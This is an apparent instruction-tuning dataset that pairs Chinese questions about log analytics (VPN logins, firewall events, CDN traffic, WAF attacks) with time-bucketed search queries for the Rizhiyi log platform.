{"input": "", "instruction": "我想问的是戴尔 EMC 存储的登录结果？按时段排序，统计出总共使用了多少次。", "output": "appname:emc tag:dell  emc.login_detail.Username:* | bucket timestamp span=1h as ts | stats count() as cnt by ts,emc.result"}
{"input": "", "instruction": "我想问的是在哪个地区有大量的用户登录VPN?可以把结果按时间段分组展示吗？", "output": "appname:vpn vpn.login_user:\"aaa\" vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by ts,vpn.src_ip.geo.city"}
{"input": "", "instruction": "我想要知道在一天内有多少条记录属于DB2数据库的各个级别。", "output": "appname:db2 |bucket timestamp span=1d as ts |stats count() as cnt by ts,db2.LEVEL"}
{"input": "", "instruction": "我想问的是，日志易应用有哪些报错？可以根据时间和应用进行分组统计吗？", "output": "tag:rizhiyi_internal error | bucket timestamp span=1h as ts |stats count() as count_ by ts,appname"}
{"input": "", "instruction": "我想要知道某一天nsfocus应用的访问量有多少，并且按分钟分组。", "output": "appname:ips  tag:nsfocus ips.level:>2 | bucket timestamp span=1m as ts  | stats count() as count_ by appname,ts "}
{"input": "", "instruction": "我想问的是，有多少用户登录失败的主机数量和时间分布情况是怎样的？可以按主机名进行分组统计吗？", "output": "appname:aix tag:failedlogin [[appname:aix tag:failedlogin|stats count(hostname) as count_ by hostname|fields hostname]]| bucket timestamp span=30m as ts|stats count(hostname) by hostname,ts"}
{"input": "", "instruction": "我想问的是，有没有人访问过某个叫做“路由器”的应用名为“锐捷”并且带有“认证成功”的标签的日志吗？而且这个分组统计的时间间隔在三十分钟以内", "output": "appname:router tag:ruijie *AUTH* |bucket timestamp span=30m as ts | stats count() as cnt by ts,router.auth_result"}
{"input": "", "instruction": "我想问的是，在哪个时间段内有多少条记录被发送到安全网关的 barracuda 标签下，并且包含 event_name 为 \"RECV\" 的数据？", "output": "appname:security_gateway tag:barracuda security_gateway.event_name:RECV| bucket timestamp span=5m as ts |stats count() as count_1 by  ts"}
{"input": "", "instruction": "我想问发生错误数量和各个模块的时段分布情况", "output": "appname:hundsun tag:error  appname:hundsun|bucket timestamp span=5m as ts | stats count() by middleware.module,ts"}
{"input": "", "instruction": "我想问的是，有多少个用户访问过我们的CDN服务？返回ISP（互联网服务提供商）和总数的小时级别对照表。", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats count(cdn.geo.isp) as total by ts, cdn.geo.isp|eval time=formatdate(ts,\"yyyy-MM-dd HH\")"}
{"input": "", "instruction": "我想问的是，网站访问量最高的 IP 是哪个？你可以把这些数据画成折线图或者柱状图，让我看看", "output": "appname:varnish_log AND varnish.request_domain:live.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "我想要知道网站 images.rizhiyi.com 每天有多少人访问过。请帮我把这些数据显示在图表上，并按 IP 地址进行分组。", "output": "appname:varnish_log AND varnish.request_domain:images.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "我想问的是，每天图片访问量最多的 IP 是哪些？你可以把结果展示给我吗？", "output": "appname:varnish_log AND varnish.request_domain:img.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "我想问有关某一天的云加速服务商 RizhiYi Cloud CDN 服务的访问量情况，具体来说，需要统计从 cloud.rizhiyi.com 这个域名下所有 IP 地址的请求数量分布情况，时间分段为一天的数据，并将结果以 ts（时间）和 cdn.remote_addr（IP 地址）为维度进行汇总。", "output": "appname:cdn_log AND cdn.request_domain:cloud.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "我想问有关某一天的云加速服务商（CDN）在某个域名下的访问量情况：1、需要从名为`cdn_log`的应用中检索数据；2、需要根据字段`cdn.request_domain`筛选出包含字符串`portal.rizhiyi.com`的记录；3、时间范围限定为每一天的数据；4、聚合统计结果时需将字段`cdn.remote_addr`作为分组依据并计算出现次数的总和；5、最终生成以时间(`ts`)为维度，访问 IP (`cdn.remote_addr`) 为指标的访问数量分布图。", "output": "appname:cdn_log AND cdn.request_domain:portal.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "帮我做 CDN 访问统计的报表，我的请求域名为 rizhiyi.com，存储桶为 cdn_log，每行统计的时间范围为一天。", "output": "appname:cdn_log AND cdn.request_domain:rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "我想问的是，有多少人访问了 rizhiyi.com/help 下的资源？并且根据他们的 IP 地址进行分组统计，并将结果按时间对齐显示。", "output": "appname:cdn_log AND cdn.request_domain:help.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "我想问的是 VPN 在 h3c 这个标签下的访问量统计情况，时间粒度为一天。", "output": "appname:vpn AND tag:h3c | bucket timestamp span=1d as ts  |stats count(tag)  by tag,ts"}
{"input": "", "instruction": "我想问的是，tomcat 应用有哪些页面访问量最高？你可以帮我把这些结果按访问时段排序吗？", "output": "appname:pf_tomcat AND  [[appname:pf_tomcat  |stats count() as count_ by tomcat.uri |sort by count_ |limit 10|fields tomcat.uri]] | bucket timestamp span=30m as ts| stats count() as count_ by tomcat.uri,ts"}
{"input": "", "instruction": "我想问的是每个小时内发生过的各个攻击类型有多少起。", "output": "appname:nta tag:chaitin|bucket timestamp span=1h as ts |stats count() by nta.attack_type |limit 10"}
{"input": "", "instruction": "我想要知道在 fortress 这个应用中，每三十分钟内最常见的操作类型有哪些以及数量是多少。", "output": "appname:fortress tag:safety   |bucket timestamp span=30m as ts| stats count() as cnt by 'fortress.kv.操作类型',ts|sort by cnt|limit 10"}
{"input": "", "instruction": "我想问有关流媒体应用“stb_vixtel_smpegts”的性能情况，特别是关于其在十分钟内的冷启动时间和下载时间以及直播流的冻结率走势。", "output": "appname:stb_vixtel_smpegts (stb_vixtel_smpegts.freezeTime:>0 AND stb_vixtel_smpegts.downloadTime:>0)|bucket timestamp span=10m as ts|eval freezeTime=tolong(stb_vixtel_smpegts.freezeTime)|eval downloadTime=tolong(stb_vixtel_smpegts.downloadTime)| stats sum(freezeTime) as freezeTime1,sum(downloadTime) as downloadTime1 by ts|eval liveFreezeRate=format(\"%.3f\",(freezeTime1/1000000)/downloadTime1)"}
{"input": "", "instruction": "我想问有关某些视频流量的趋势统计，这些视频CDN流量被某个叫做“华为”的公司所托管和分发。", "output": "appname:cdn tag:huawei  AND (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com)|bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by tag,ts"}
{"input": "", "instruction": "查询 firewall 应用中包含 hillstone 标签且会话结束时发生的所有数据包的总发送量，并将结果按主机名和时间段进行汇总，最后将发送字节数重命名为“发送字节数”。", "output": "appname:firewall AND tag:hillstone AND \"session end\" firewall.send_byte:*| bucket timestamp span=30m as ts |eval sbyte_=tolong(firewall.send_byte) |stats sum(sbyte_) as sendbyte by hostname,ts  | rename sendbyte as \"发送字节数\""}
{"input": "", "instruction": "我想询问 Nginx 服务器按半小时计算的总下载流量走势。", "output": "appname:pf_nginx nginx.bytes:*|eval bytes=tolong(nginx.bytes)|bucket timestamp span=30m as ts|stats sum(bytes) as ct by ts,nginx.src_ip"}
{"input": "", "instruction": "我想询问CDN访问量的情况，可能在某些时间段内对某个应用进行了大量的下载或上传活动？", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats sum(cdn.request_length) as total by ts | eval time=formatdate(ts,\"yyyy-MM-dd HH\")|eval traffic=format(\"%.2fM\",total/1024/1024)"}
{"input": "", "instruction": "我想问如何在 Squid 代理服务器的访问日志中查询总流量和日均流量。", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats sum(squid.request_length) as total by ts | eval time=formatdate(ts,\"yyyy-MM-dd\")|eval traffic=format(\"%.2fM\",total/1024/1024)"}
{"input": "", "instruction": "我想询问CDN访问量的情况：“5分钟趋势的总流量是多少吗？”", "output": "appname:cdn_log|bucket timestamp span=5m as ts|stats sum(cdn.request_length) as total by ts | eval time=formatdate(ts,\"yyyy-MM-dd HH:mm:ss\")|eval traffic=format(\"%.2fM\",total/1024/1024)"}
{"input": "", "instruction": "我想问的是 haproxy 这个服务的平均响应时间在五分钟内分别是多少，并且按不同的后端服务器进行统计。", "output": " appname:haproxy|bucket timestamp span=5m as ts|stats avg(middleware.bytes) as avg_ by ts,middleware.server"}
{"input": "", "instruction": "我想要知道我的应用的内存GC情况，以及它在每分钟内发生的所有暂停时间。请告诉我如何获取这些信息。", "output": "appname:gc AND gc.stoptime:*|bucket timestamp span=1m as ts|stats sum(gc.stoptime) as sumtime by ts|eval sumtime=if(empty(sumtime),0,sumtime)|rename sumtime as '停顿时长'"}
{"input": "", "instruction": "我想问的是，每三十分钟内记录有多少条不被防火墙接受的事件？并且把时间戳打印出来。", "output": "appname:firewall  NOT firewall.msg.action:accept |bucket timestamp span=30m as ts |stats count() as count_ by ts |eval time=formatdate(ts,\"HH:mm\")"}
{"input": "", "instruction": "我想要知道在fortress跳板机上，用户登录失败的次数在每三十分钟内有多少次。", "output": "appname:fortress tag:jumpserver  fortress.log_type:login_log fortress.status:false|bucket timestamp span=30m as ts | stats count() as cnt by ts | rename cnt as fail"}
{"input": "", "instruction": "我想询问如何使用日志易查询 IMAP 服务器的操作和数量趋势。", "output": "(appname:core tag:imap)  mail.action:*log* | bucket timestamp span=30m as ts |stats count() as cnt by mail.action,ts"}
{"input": "", "instruction": "我想问有关 Palo Alto Firewall 拒绝访问请求的数量以及发生的时间。", "output": "appname:firewall tag:paloalto AND firewall.action:deny |bucket timestamp span=10m as ts | stats count() as ct by ts | rename ct as \"事件数量\""}
{"input": "", "instruction": "我想问的是每小时有多少条记录被标记为“Palo Alto防火墙”并且类型是“威胁”。", "output": "appname:firewall tag:paloalto AND firewall.type:THREAT |bucket timestamp span=1h as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "", "instruction": "我想问的是，在每小时内，有多少次使用 Imperva WAF 的防御系统被攻击成功的情况发生了？", "output": "appname:waf tag:imperva AND waf.attack_type:特征模型 |bucket timestamp span=1h as ts |stats count() by ts | eval hour = formatdate(ts, \"HH:mm\") | eval d=\"特征模型\""}
{"input": "", "instruction": "我想问的是，在每小时内有多少次访问中存在攻击类型为“关联”的 WAF 规则的情况吗？", "output": "appname:waf tag:imperva AND waf.attack_type:关联 |bucket timestamp span=1h as ts |stats count() by ts | eval hour = formatdate(ts, \"HH:mm\") | eval d=\"关联\""}
{"input": "", "instruction": "我正在对系统中appname:switch进行故障排查，并希望通过分析该应用的错误日志来获取有关问题的信息。2. 我已经知道了要查询的字段（tag:huawei、switch.severity:<4），并且已经确定了时间分组（一小时）。3. 我需要将结果按模块分组统计，把排名前 10 的模块加入到过滤条件里，以便更好地了解错误发生的原因以及如何解决它们。", "output": "appname:switch tag:huawei switch.severity:<4 [[appname:switch tag:huawei switch.severity:<4 | top 10 switch.module|fields switch.module]] | bucket timestamp span=1h as ts|stats count() as count_ by ts,switch.module"}
{"input": "", "instruction": "我想问关于 AntiVirus Gateway 和 Symantec 标签下的消息数量以及时间戳的统计结果。", "output": "appname:antivirus_gateway tag:symantec  SID|bucket timestamp span=30m as ts | stats count() by 'antivirus_gateway.msg',ts"}
{"input": "", "instruction": "我希望了解某段时间内应用名称为“stb_vixtel_smpegts”的视频播放质量和带宽利用率情况。", "output": "appname:stb_vixtel_smpegts stb_vixtel_smpegts.avgMos:>=0 stb_vixtel_smpegts.tsLostRate:>=0stb_vixtel_smpegts.avgThroughput:>=0 NOT stb_vixtel_smpegts.programName:未知|bucket timestamp span=30m as ts|eval avgThroughput=todouble(stb_vixtel_smpegts.avgThroughput)|stats count(stb_vixtel_smpegts.programName) as playCount,avg(avgThroughput) as avg_avgThroughput by ts|eval avg_avgThroughput_1=format(\"%.2f\",avg_avgThroughput/1000000)"}
{"input": "", "instruction": "我想问有关 VPN 用户 root 在每 30 分钟内的登录、注销和认证事件数量的信息。这三种事件类型分别对应于 \"auth\"（身份验证），\"login\"（登录）以及 \"logout\"（登出）。", "output": "appname:vpn (vpn.event_name:auth OR vpn.event_name:login OR vpn.event_name:logout) vpn.user_name:root   | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "", "instruction": "我正在寻找名为“Fortress”且具有“pldsec”标签的应用（appname）在每五分钟内发生的所有登录事件（type=login）的数量统计信息（count() as ct by ts）。此外，您还要求结果按时间戳（ts）进行排序并以“fortress.msg.sysuser”作为分组依据。", "output": "( appname:fortress tag:pldsec ) \"BLJPri UMA\" type=login|bucket timestamp span=5m as ts|stats count() as ct by ts,fortress.msg.sysuser"}
{"input": "", "instruction": "我想要知道在某一台主机上有多少个应用名称为“ips”且标签包含“h3c”的日志数量和各个时间点上的数量。", "output": "appname:ips AND tag:h3c |bucket timestamp span=5m as ts | stats count() as cnt by ts,hostname"}
{"input": "", "instruction": "我想要知道每小时内有多少条记录包含关键字 firewall 和 h3c 以及对应的主机名。请问您需要我提供哪些其他信息？", "output": "appname:firewall AND tag:h3c | bucket timestamp span=1h as ts | stats count() as cnt by ts,firewall.host"}
{"input": "", "instruction": "我想问的是 firewall 和 h3c 有关的访问量统计信息，时间间隔为一小时。请再优化一下查询语句。", "output": "appname:firewall AND tag:h3c | bucket timestamp span=1h as ts | stats count() as cnt by ts,firewall.dup_add"}
{"input": "", "instruction": "我想要知道系统中有哪些应用名为 firewall 的进程，并且这些进程的标签包含 h3c 这个关键字，并按时间对它们进行统计，将结果以时间为维度分组并计算出数量。", "output": "appname:firewall AND tag:h3c | bucket timestamp span=1h as ts | stats count() as cnt by ts,firewall.source"}
{"input": "", "instruction": "我想问的是最近五分钟内有没有访问过 firewall 和 venustech 标签的应用名称为 appname 的主机名，并统计出访问次数。", "output": "appname:firewall AND tag:venustech |bucket timestamp span=5m as ts |stats count() as cnt by ts,hostname"}
{"input": "", "instruction": "我想问的是，在 firewall 这个应用中，有没有使用 dell 这款硬件的机器出现过丢包的情况？并且统计出这些情况发生的时间和次数。", "output": "appname:firewall tag:dell \"dropped\" | bucket timestamp span=10m as ts1|stats count() by ts1"}
{"input": "", "instruction": "我想问的是 haproxy 这个服务的某些指标在一段时间内（比如每十分钟）有多少条数据，并且按服务器 middleware.server 来做维度划分。", "output": "appname:haproxy|bucket timestamp span=10m as ts|stats count() as cnt by ts,middleware.server"}
{"input": "", "instruction": "我想问的是，在每十分钟内，有多少个请求源自于 Huawei 的IDS，并带有任意攻击名称的记录？", "output": "appname:ids tag:huawei ids.attack_name:* |bucket timestamp span=10m as ts | stats count() as cnt by ids.src_ip|limit 10"}
{"input": "", "instruction": "我想要知道谁在使用Fortinet防火墙的应用，以及他们访问我的网站时从哪些IP地址进行连接。这需要对系统事件进行分组和统计，以便更好地了解用户行为模式并采取适当的行动。", "output": "appname:ips tag:fortinet | bucket timestamp span=1h as ts |stats count(ips.dst.geo.ip) by appname,ts"}
{"input": "", "instruction": "我想询问 VPN 用户 root 在使用应用名为“VPN”的服务时执行登录或桶操作的次数，并将结果按消息、操作类型和时间分组汇总。", "output": "appname:vpn vpn.user:root AND vpn.actype:login|bucket timestamp span=1h as ts |stats count() as cnt by vpn.msg,vpn.actype,ts"}
{"input": "", "instruction": "我想问有关某些应用的访问统计信息，其中包括 Tomcat 服务的 HTTP 方法、请求数量和时间戳等内容。", "output": "appname:pf_tomcat |bucket timestamp span=1h as ts|stats count() as count_ by ts,tomcat.method"}
{"input": "", "instruction": "我想要知道网站 appname:pf_nginx 在一小时内的访问量和请求方式分布情况。请告诉我这些信息。", "output": "appname:pf_nginx |bucket timestamp span=1h as ts|stats count() as count_ by ts,nginx.method"}
{"input": "", "instruction": "我想询问关于frontend应用的前端错误信息统计情况，具体来说，您所提供的信息表明该应用在一小时内发生了多少次搜索、警报、计划和报告类别的错误事件。", "output": "appname:frontend_log  AND  (frontend.message.category:search OR frontend.message.category:alert OR frontend.message.category:schedule OR frontend.message.category:report) |bucket timestamp span=1h as ts | stats count() as count_  by frontend.message.category,ts "}
{"input": "", "instruction": "我想问如何编写一个对 AntiVirus Gateway 应用、使用标签 \"Officescan\"、检测结果包含 \"FAIL\" 的事件进行数量趋势聚合的 SPL 查询。", "output": "appname:antivirus_gateway tag:officescan antivirus.domain:* antivirus.result:*FAIL |bucket timestamp span=1h as ts | stats count() as cnt by ts "}
{"input": "", "instruction": "我想要知道主机的运行状况和性能情况，所以我想知道ESXI服务器在最近一小时内有多少次启动或关闭虚拟机的操作记录。", "output": "appname:esxi AND 'tag':hostd esxi.action:logged*|bucket timestamp span=1h as ts  | stats count() as cnt by ts,esxi.action"}
{"input": "", "instruction": "我想要知道有多少条记录满足条件：`appname:waf tag:river|bucket timestamp span=1h as ts|stats count() as count_ by waf.method,ts`。", "output": "appname:waf tag:river|bucket timestamp span=1h as ts|stats count() as count_ by waf.method,ts"}
{"input": "", "instruction": "我想要针对天融信 IPS 的不同操作，根据时间段进行分组统计。请帮我把这些信息展示给我。", "output": "appname:ips tag:topsec |bucket timestamp span=1h as ts |stats count() as a by ips.action,ts"}
{"input": "", "instruction": "我想问的是，从2023年1月1日开始到现在有多少次访问cdn的服务，并且缓存命中状态码为hit。", "output": "starttime=2023-01-01:00:00:00 appname:cdn AND cdn.cdn_status:*HIT| bucket timestamp span=1m as ts | stats count() by appname,ts"}
{"input": "", "instruction": "我想询问视频流量的统计信息，具体来说，这些视频流量所使用的CDN服务商为华为，并且域名分别为 vod1.video.com、vod2.video.com、vod3.video.com 和 vod4.video.com 。此外，时间间隔为一分钟，并将访问次数进行汇总。", "output": "appname:cdn tag:huawei AND (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com) | bucket timestamp span=1m as ts | stats count() as count_ by ts "}
{"input": "", "instruction": "我想问的是 Kafka 是不是性能不行啊？为什么有时候消费的消息很多，有的时候就很少呢？而且还有时候会出现重复消费的问题。", "output": "appname:kafka tag:performance kafka.topic:raw_message |bucket timestamp span=1m as ts|stats count() by ts,kafka.partition,kafka.lag"}
{"input": "", "instruction": "我想询问 AIX 登录失败情况，并希望通过分析登录失败的时间和地点来找出可能存在的安全风险。", "output": "appname:aix AND \"Failed password for\" |bucket timestamp span=30m as ts1|stats count() as ct by aix.dst_host,ts1"}
{"input": "", "instruction": "我想问有关 F5 Big-IP LTM Load Balancer 的应用信息和性能数据。关于应用名称为“LoadBalancing”且具有标记“F5”的对象以及其类型为 logger、时间戳在每 30 分钟内的数据集，并希望以时间序列（ts）和访问次数（ct）作为结果列出。", "output": "appname:loadbalancing tag:f5 AND loadbalancing.type:logger|bucket timestamp span=30m as ts|stats count() as ct by ts|rename ct  as \"访问次数\""}
{"input": "", "instruction": "我想问的是，在每三十分钟内，有多少人登录成功的 Fortress 服务？", "output": "appname:fortress tag:shterm fortress.type:* | bucket timestamp span=30m as ts | stats count() as total by fortress.loginOK,ts"}
{"input": "", "instruction": "我想问的是 juniper firewall 下各个服务在每 30 分钟内有多少请求。", "output": "appname:firewall  tag:juniper |bucket timestamp span=30m as ts | stats count() as total  by firewall.service,ts"}
{"input": "", "instruction": "我想问的是什么时候访问量突然暴增的，所以应该按时间段统计，并对比不同 IP 下的访问次数。", "output": "appname:pf_nginx |bucket timestamp span=30m as ts|stats count() as ct by ts,nginx.src_ip"}
{"input": "", "instruction": "我想知道 Nginx 服务的状态有多么不健康，所以我想要你把所有返回码大于等于 400 的请求数统计出来并按时间段分组。", "output": "appname:pf_nginx nginx.status:>399|bucket timestamp span=30m as ts| stats count() as count_ by nginx.status,ts"}
{"input": "", "instruction": "我想问的是，在每三十分钟内，有多少次攻击类型为 appname:waf 和 tag:chatin 的请求被拒绝？", "output": "(appname:waf AND tag:chatin) waf.action:deny|bucket timestamp span=30m as ts  |stats count() as cnt by waf.attack_type,ts"}
{"input": "", "instruction": "我想问如何使用日志易查询最近三十分钟内的应用访问 IP 和标记为 legendsec 的数据流量数量统计信息。", "output": "appname:ips tag:legendsec| bucket timestamp span=30m as ts | stats count()  as a by ips.proto,ts"}
{"input": "", "instruction": "我想要知道Array 负载均衡器在每30分钟内有多少次请求失败的情况。请告诉我这些信息。", "output": "(appname:loadbalancing AND tag:array ) |bucket timestamp span=30m as ts|rename loadblancing.* as * | stats count() as cnt by status,ts"}
{"input": "", "instruction": "我想问如何编写一个对 Norton AntiVirus 感兴趣的、不包含 Eset Threat Event 的时间序列数据集中进行聚合和统计的查询。", "output": "appname:antivirus tag:norton NOT atv.cat:\"ESET Threat Event\"| bucket timestamp span=30m as ts | stats count() as cnt by ts,atv.cat "}
{"input": "", "instruction": "我想问的是，每三十分钟内有多少个 Huawei Firewall 报告的严重性为错误或警告？", "output": "(* AND appname:firewall) AND tag:huawei |bucket timestamp span=30m as ts | stats count() as total by firewall.severity,ts"}
{"input": "", "instruction": "我想问的是 MongoDB 日志里操作命令在这段时间内的访问量情况？？", "output": "appname:mongodb |bucket timestamp span=5m as ts|stats count() as count1 by mongodb.action,ts"}
{"input": "", "instruction": "根据安全网关应用名称、标记为 barracuda 的事件、安全网关事件名称等于 SEND 的时间桶长度为 5 分钟的日志聚合统计数量。", "output": "appname:security_gateway tag:barracuda security_gateway.event_name:SEND| bucket timestamp span=5m as ts |stats count() as count_1 by  ts"}
{"input": "", "instruction": "我想问的是 oracle 这个应用在 audit 和 bucket 这两个标签下，最近五分钟内执行了多少条命令。请帮我把这些信息展示给我。", "output": "appname:oracle tag:audit|bucket timestamp span=5m  as ts|stats count() by ts,audit.command"}
{"input": "", "instruction": "帮我分析squid 缓存访问量的情况吧：“我需要知道网站每小时在不同省份的用户数分布情况”。", "output": "appname:squid_log|bucket timestamp span=1h as ts|stats count(squid.geo.province) as total by ts, squid.geo.province"}
{"input": "", "instruction": "我想跟踪网站 www.rizhiyi.com 的 Varnish 访问量情况，并按 IP 分组统计每天的结果。", "output": "appname:varnish_log AND varnish.request_domain:www.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "我想问的是，从哪些地区的用户CDN访问量最高呢？你能帮我把这些数据按月统计画成折线图吗？", "output": "appname:cdn_log|bucket timestamp span=1M as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province|eval time=formatdate(ts,\"yyyy-MM\")"}
{"input": "", "instruction": "我想要知道中间件 IIS 日志量的统计，并按方法和时间分组统计数量。", "output": "appname:middleware tag:iis |bucket timestamp span=5m as ts|stats count() as count_ by middleware.method,ts"}
{"input": "", "instruction": "每三十分钟内“aix”的所有主机上，失败密码登录尝试数目统计情况。", "output": "appname:aix AND \"Failed password for\" |bucket timestamp span=30m as ts1|stats count() as ct by aix.dst_host,ts1"}
{"input": "", "instruction": "我想问的是，在每十五分钟里，有多少台设备使用了 HIDS（主机入侵检测系统）并进行了远程登录，并且不在中国地区？", "output": "appname:hids tag:safedog  hids.event_type:remoteLogin NOT hids.country:中国| bucket timestamp span=15m as ts |stats count() as cnt by hids.hostName"}
{"input": "", "instruction": "我想问的是，在每十五分钟里，有多少用户使用了“安全狗”应用并进行了远程登录，并且他们的国家不是中国。", "output": "appname:hids tag:safedog  hids.event_type:remoteLogin NOT hids.country:中国| bucket timestamp span=15m as ts |stats count() as cnt by hids.country"}
{"input": "", "instruction": " VPN 登录的结果是成功还是失败的数量趋势，而且时间段为今天。", "output": "starttime=\"now/d\" appname:vpn vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "", "instruction": "我想问的是 VPN 登录的结果是成功还是失败，而且我只需要知道今天每三十分钟内的数量统计情况？", "output": "starttime=\"now/d\" appname:vpn vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "", "instruction": "我想问有关在过去一天内发生的数据库安全事件数量以及它们的时间范围和严重性信息。", "output": "starttime=\"-1d\" (appname:dbaudit AND tag:dbappsecurity) |bucket timestamp span=30m as ts | stats count() as cnt by ts,dbaudit.level"}
